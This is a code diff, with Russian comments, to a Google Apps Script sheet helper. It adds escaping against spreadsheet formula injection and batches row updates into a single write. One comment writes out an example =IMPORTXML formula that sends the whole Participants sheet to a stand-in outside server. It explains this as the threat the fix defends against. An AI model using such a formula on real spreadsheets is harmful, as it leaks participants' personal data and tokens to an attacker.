@@ -94,22 +94,72 @@ function findRows(sheetName, keyColumn, keyValue) {
   return getRows(sheetName).filter((r) => String(r[keyColumn]) === String(keyValue));
 }
 
+/**
+ * ЗАЩИТА ОТ ИНЪЕКЦИИ ФОРМУЛ (02.09.2026).
+ *
+ * Apps Script пишет строку в ячейку ровно так же, как если бы её напечатал
+ * человек: значение, начинающееся с "=", становится ЖИВОЙ ФОРМУЛОЙ, а не
+ * текстом. А в таблицу попадает то, что ввёл посторонний: сообщение в
+ * поддержку (submitSupport_), имя из профиля Telegram (ensureParticipantRow_),
+ * идентификатор документа при загрузке (uploadDocument_).
+ *
+ * Чем это грозило. Студент отправляет в поддержку текст
+ *   =IMPORTXML("https://чужой-сервер/?d="&TEXTJOIN(",",1,Participants!A:K),"//a")
+ * Как только координатор откроет таблицу, серверы Google САМИ сходят на чужой
+ * сервер и передадут в адресе весь лист Participants — телефоны, ID сделок,
+ * ФИО, этапы всех участников. Пароль для этого не нужен вообще. Тем же приёмом
+ * вытягивается лист LinkTokens, то есть готовые токены привязки к чужим сделкам.
+ *
+ * Лечение — апостроф в начале. Для Google Sheets это команда «считать
+ * содержимое текстом»; в самой ячейке апостроф не отображается и в прочитанном
+ * обратно значении его нет, поэтому на остальной код правка не влияет.
+ * Опасны четыре первых символа: = (формула), + и - (тоже начинают формулу),
+ * @ (устаревший синтаксис ссылок, до сих пор работает).
+ *
+ * Даты и числа проходят мимо: проверяем только строки.
+ */
+function safeCellValue_(value) {
+  if (typeof value !== "string") return value;
+  return /^[=+\-@]/.test(value) ? "'" + value : value;
+}
+
 /** Appends a new row; `data` keys must match existing headers (extra keys ignored). */
 function appendRow(sheetName, data) {
   const sh = sheet_(sheetName);
   const heads = headers_(sh);
-  const row = heads.map((h) => (h in data ? data[h] : ""));
+  const row = heads.map((h) => safeCellValue_(h in data ? data[h] : ""));
   sh.appendRow(row);
   invalidateRowsCache_(sheetName);
 }
 
-/** Updates an existing row (found via _row from getRows/findRow) with the given fields. */
+/**
+ * Updates an existing row (found via _row from getRows/findRow) with the given fields.
+ *
+ * ЗАПИСЬ ОДНИМ ОБРАЩЕНИЕМ (02.09.2026). Здесь стоял цикл с отдельным
+ * getRange().setValue() НА КАЖДОЕ ПОЛЕ. Один вебхук из amoCRM по привязанной
+ * сделке трогает участника (8 полей), до трёх платежей (по 8) и до пяти
+ * документов (по 6) — это под шестьдесят сетевых обращений к таблице там, где
+ * достаточно девяти. Из-за этой медлительности сделка не успевала
+ * обработаться за отведённые локу 10 секунд, и при перетаскивании нескольких
+ * сделок на канбане часть вебхуков молча отваливалась по таймауту.
+ *
+ * Теперь строка читается целиком, изменяются нужные ячейки в памяти и
+ * записывается обратно одним setValues. Значения, которых нет в data,
+ * перезаписываются сами собой — тем, что уже лежало в строке.
+ */
 function updateRow(sheetName, rowNumber, data) {
   const sh = sheet_(sheetName);
   const heads = headers_(sh);
+  const range = sh.getRange(rowNumber, 1, 1, heads.length);
+  const current = range.getValues()[0];
+  let changed = false;
   heads.forEach((h, j) => {
-    if (h in data) sh.getRange(rowNumber, j + 1).setValue(data[h]);
+    if (h in data) {
+      current[j] = safeCellValue_(data[h]);
+      changed = true;
+    }
   });
+  if (changed) range.setValues([current]);
   invalidateRowsCache_(sheetName);
 }
 
